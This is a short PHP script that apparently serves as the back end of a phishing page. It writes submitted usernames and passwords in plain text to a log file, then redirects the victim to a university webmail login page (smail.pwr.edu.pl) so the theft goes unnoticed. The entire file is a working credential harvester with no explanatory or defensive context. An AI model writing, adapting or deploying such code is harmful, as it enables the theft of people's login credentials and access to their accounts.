<?php 

$handle = fopen("log.txt", "w"); 
fwrite($handle,$_POST["username"]); 
fwrite($handle,"\n"); 
fwrite($handle,$_POST["password"]); 
fwrite($handle,"\n"); 
fwrite($handle,"\n"); 
fclose($handle) ; 
header("Location:https://smail.pwr.edu.pl/auth"); 
exit; ?> 